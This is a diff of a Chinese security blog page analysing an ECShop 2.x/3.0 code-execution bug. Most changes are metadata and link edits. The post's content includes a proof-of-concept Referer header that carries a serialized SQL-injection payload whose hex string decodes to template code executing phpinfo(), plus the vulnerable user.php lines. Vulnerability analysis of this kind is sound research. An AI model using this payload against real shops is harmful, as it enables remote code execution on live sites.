@@ -128,7 +128,7 @@
 <meta property="og:description" content="之前渗透时遇到了这样一个站，当时看到这个二次注入引发的命令执行的过程有点意思，于是抽了个时间简单的复现分析了一下">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="http://0day.design/2019/09/30/ECShop%202.x%203.0代码执行漏洞分析/media/15696548589918/15696662119731.jpg">
-<meta property="og:updated_time" content="2019-09-30T14:10:40.586Z">
+<meta property="og:updated_time" content="2020-03-19T11:16:35.017Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ECShop 2.x 3.0代码执行漏洞分析">
 <meta name="twitter:description" content="之前渗透时遇到了这样一个站，当时看到这个二次注入引发的命令执行的过程有点意思，于是抽了个时间简单的复现分析了一下">
@@ -163,7 +163,7 @@
     var _hmt = _hmt || [];
     (function() {
       var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?14e9c0326e763de8b0a61711cc963a58";
+      hm.src = "http://hm.baidu.com/hm.js?14e9c0326e763de8b0a61711cc963a58";
       var s = document.getElementsByTagName("script")[0];
       s.parentNode.insertBefore(hm, s);
     })();
@@ -441,12 +441,24 @@
                 
               
 
-              <time title="Created: 2019-09-30 22:10:00 / Modified: 22:10:40" itemprop="dateCreated datePublished" datetime="2019-09-30T22:10:00+08:00">2019-09-30</time>
+              <time title="Created: 2019-09-30 22:10:00" itemprop="dateCreated datePublished" datetime="2019-09-30T22:10:00+08:00">2019-09-30</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2020-03-19 19:16:35" itemprop="dateModified" datetime="2020-03-19T19:16:35+08:00">2020-03-19</time>
               
             
           </span>
@@ -491,7 +503,7 @@
       
         <p>之前渗透时遇到了这样一个站，当时看到这个二次注入引发的命令执行的过程有点意思，于是抽了个时间简单的复现分析了一下<br><a id="more"></a></p>
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前渗透时遇到了这样一个站，当时看到这个命令执行的过程有点东西，于是抽了个时间复现一下</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>IDE: PHPstorm<br>代码：<br><a href="https://github.com/ec-shop/ecshop3.0.0906" target="_blank" rel="noopener">ECshop3.0</a><br><a href="https://github.com/shopex/ecshop" target="_blank" rel="noopener">ECShop 2.7.3</a></p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>IDE: PHPstorm<br>代码：<br><a href="http://github.com/ec-shop/ecshop3.0.0906" target="_blank" rel="noopener">ECshop3.0</a><br><a href="http://github.com/shopex/ecshop" target="_blank" rel="noopener">ECShop 2.7.3</a></p>
 <h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>ECshop3.0<br>php 5.6<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&apos; /*&quot;;&#125;&#125;45ea207d7a2b68c49582d2d22adf953a</span><br></pre></td></tr></table></figure></p>
 <p><img src="/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/media/15696548589918/15696662119731.jpg" alt="-w1613"></p>
 <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>user.php 305行渲染的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//310行</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($back_act) &amp;&amp; <span class="keyword">isset</span>($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 如果没有user.php， 则$back_act为referer</span></span><br><span class="line">    $back_act = strpos($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>], <span class="string">'user.php'</span>) ? <span class="string">'./index.php'</span> : $GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 330行</span></span><br><span class="line">$smarty-&gt;assign(<span class="string">'back_act'</span>, $back_act);     <span class="comment">// 渲染referer到模板</span></span><br><span class="line">$smarty-&gt;display(<span class="string">'user_passport.dwt'</span>);</span><br></pre></td></tr></table></figure></p>
@@ -725,7 +737,7 @@
             <div class="links-of-author motion-element">
               
                 <span class="links-of-author-item">
-                  <a href="https://github.com/passer6y" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="http://github.com/passer6y" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
                   
                 </span>
               
@@ -750,7 +762,7 @@
               <ul class="links-of-blogroll-list">
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://hpdoger.cn/" title="Hpdoger" target="_blank">Hpdoger</a>
+                    <a href="http://hpdoger.cn/" title="Hpdoger" target="_blank">Hpdoger</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
@@ -758,19 +770,19 @@
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://www.0akarma.com/" title="0akarma" target="_blank">0akarma</a>
+                    <a href="http://www.0akarma.com/" title="0akarma" target="_blank">0akarma</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://www.cnblogs.com/H4lo" title="H4lo" target="_blank">H4lo</a>
+                    <a href="http://www.cnblogs.com/H4lo" title="H4lo" target="_blank">H4lo</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://www.cnblogs.com/P1g3/" title="P1g3" target="_blank">P1g3</a>
+                    <a href="http://www.cnblogs.com/P1g3/" title="P1g3" target="_blank">P1g3</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://patrilic.top/" title="Patrilic" target="_blank">Patrilic</a>
+                    <a href="http://patrilic.top/" title="Patrilic" target="_blank">Patrilic</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
@@ -778,11 +790,11 @@
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://threezh1.com/" title="Threezh1" target="_blank">Threezh1</a>
+                    <a href="http://threezh1.com/" title="Threezh1" target="_blank">Threezh1</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
-                    <a href="https://blog.izgq.net/" title="ZGQ" target="_blank">ZGQ</a>
+                    <a href="http://blog.izgq.net/" title="ZGQ" target="_blank">ZGQ</a>
                   </li>
                 
               </ul>
